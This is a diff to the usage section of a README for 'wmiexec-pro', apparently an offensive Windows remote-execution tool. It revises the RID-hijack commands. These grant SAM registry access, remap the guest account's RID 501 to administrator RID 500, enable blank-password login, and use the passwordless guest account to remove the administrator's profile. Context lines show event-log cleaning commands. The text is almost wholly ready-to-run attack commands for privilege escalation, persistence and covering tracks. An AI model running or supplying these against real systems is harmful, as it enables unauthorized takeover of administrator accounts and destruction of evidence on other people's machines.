@@ -132,15 +132,19 @@ Eventlog:
    python3 wmiexec-pro.py administrator:password@192.168.1.1 eventlog -retrive object-ID (Stop looping cleaning eventlog)
 
 RID Hijack:
-   python3 wmiexec-pro.py administrator:password@192.168.1.1 rid-hijack -user 501 -action grant (Grant access permissions for SAM/SAM subkey in registry)
-   python3 wmiexec-pro.py administrator:password@192.168.1.1 rid-hijack -user 501 -action grant-old (For old version OS, such as server 2003)
-   python3 wmiexec-pro.py administrator:password@192.168.1.1 rid-hijack -user 501 -action retrieve (Restrict access permissions for SAM/SAM subkey in registry)
-   python3 wmiexec-pro.py administrator:password@192.168.1.1 rid-hijack -user 501 -action retrieve-old (For old version OS, such as server 2003)
-   python3 wmiexec-pro.py administrator:password@192.168.1.1 rid-hijack -user 501 -action activate (Activate user)
-   python3 wmiexec-pro.py administrator:password@192.168.1.1 rid-hijack -user 501 -action deactivate (Deactivate user)
-   python3 wmiexec-pro.py administrator:password@192.168.1.1 rid-hijack -user 501 -action hijack -user 501 -hijack-rid 500 (Hijack guest user rid 501 to administrator rid 500)
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 rid-hijack -query (Dump all user information)
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 rid-hijack -hijack-target 501 -action grant (Grant access permissions for SAM/SAM subkey in registry)
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 rid-hijack -hijack-target 501 -action grant-old (For old version OS, such as server 2003)
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 rid-hijack -hijack-target 501 -action retrieve (Restrict access permissions for SAM/SAM subkey in registry)
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 rid-hijack -hijack-target 501 -action retrieve-old (For old version OS, such as server 2003)
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 rid-hijack -hijack-target 501 -action activate (Activate user)
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 rid-hijack -hijack-target 501 -action deactivate (Deactivate user)
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 rid-hijack -hijack-target 501 -action hijack -hijack-target 501 -hijack-rid 500 (Hijack guest user rid 501 to administrator rid 500)
    python3 wmiexec-pro.py administrator:password@192.168.1.1 rid-hijack -blank-pass-login enable (Enable blank password login)
    python3 wmiexec-pro.py administrator:password@192.168.1.1 rid-hijack -blank-pass-login disable
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 rid-hijack -backup 500 (This will save user profile data as json file)
+   python3 wmiexec-pro.py guest@192.168.1.1 -no-pass rid-hijack -hijack-target 500 -remove (Use guest user remove administrator user profile after rid hijacked)
+   python3 wmiexec-pro.py guest@192.168.1.1 -no-pass rid-hijack -restore "backup.json" (Restore user profile for target user)
    
 ```
 
